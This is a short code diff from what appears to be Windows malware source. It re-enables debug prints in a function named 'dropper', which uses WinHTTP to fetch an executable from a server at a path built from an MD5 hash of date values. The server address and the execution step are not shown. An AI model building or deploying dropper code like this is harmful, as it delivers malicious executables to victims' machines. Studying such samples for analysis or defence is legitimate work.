@@ -110,8 +110,8 @@ void dropper(wchar_t* path) {
     wchar_t* new_path = new wchar_t[34];
     new_path[0] = L'/';
     memcpy(&new_path[1], path, 66);
-    //wprintf(L"Path: %s\n", path);
-    //wprintf(L"%s\n", new_path);
+    wprintf(L"Path: %s\n", path);
+    wprintf(L"%s\n", new_path);
     hrequest = WinHttpOpenRequest(hconnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
     // report any errors
@@ -236,7 +236,7 @@ int main() {
 
     // get md5 conversion of the above date values
     wchar_t* path = md5sum(byte_array);
-    //wprintf(L"Path: %s\n", path);
+    wprintf(L"Path: %s\n", path);
 
     // get executable from server
     dropper(path);
